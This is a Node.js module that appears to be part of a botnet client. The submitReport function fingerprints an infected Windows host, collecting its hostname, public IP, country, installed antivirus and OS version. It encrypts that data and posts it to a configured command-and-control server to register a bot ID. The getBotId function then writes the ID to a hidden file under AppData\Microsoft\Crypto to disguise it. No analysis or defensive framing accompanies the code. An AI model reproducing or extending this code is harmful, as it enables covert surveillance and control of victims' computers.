const axios = require('axios');
const core = require('./core');
const config = require('../config');
const crypto = require('./crypto');
const path = require('path');
const fs = require('fs');

async function submitReport() {
    const hostname = core.execClear('hostname') == "" ? "hostname" : core.execClear('hostname');
    const ip = await getPublicIp();
    const country = await getCountry();
    const av = getAntivirus();
    const os = getSystemVersion();

    const data = crypto.encrypt(JSON.stringify({hostname: hostname, ip: ip, country: country, av: av, os: os}), config.encryptedKey);

    let botId;
    await axios.post(config.baseurl + "/report/" + config.id, data, {
        headers: {
            'Content-Type' : 'text/plain' 
        }
    }).then(function (response) {
        botId = response.data;
    }).catch(function (error) { });

    return botId;
}

async function getBotId() {
    const savePath = path.join(process.env.appdata, 'Microsoft', 'Crypto', `ID${config.id}`);
    if (fs.existsSync(savePath)) {
        return fs.readFileSync(savePath).toString();
    } else {
        const botId = await submitReport();
        core.createDirectoryRecursively(savePath);
        fs.writeFileSync(savePath, botId);
        core.hideFile(savePath);
        return botId;
    }
} 

async function getPublicIp() {
    try {
        const res = await axios({
            url: "https://api.ipify.org",
            method: "GET"
        });

        if (res.data.length > 16) {
            return "69.69.69.69";
        } else {
            return res.data;
        }
    } catch (e) {
        return "69.69.69.69";
    }
}

async function getCountry() {
    try {
        const res = await axios({
            url: "http://ip-api.com/line/?fields=countryCode",
            method: "GET"
        });
        
        if (res.data.length > 3) {
            return "UKN";
        } else {
            return res.data.replace('\n', '');
        }
    } catch (e) {
        return "UKN"
    }
}

function getAntivirus() {
    try {
        const res = core.execClear(`wmic /node:localhost /namespace:\\\\root\\SecurityCenter2 path AntiVirusProduct Get DisplayName | findstr /V /B /C:displayName`);
        return res == "" ? "No Antivirus" : res;
    } catch (e) {
        return "No Antivirus";
    }
}

function getSystemVersion() {
    try {
        const res = core.execClear(`wmic os get Caption | findstr /V /B /C:Caption`);
        return res == "" ? "Unknow Version" : res.replace('microsoft', '');
    } catch (e) {
        return "Unknow Version";
    }
}

module.exports = {
    getCountry,
    getBotId
}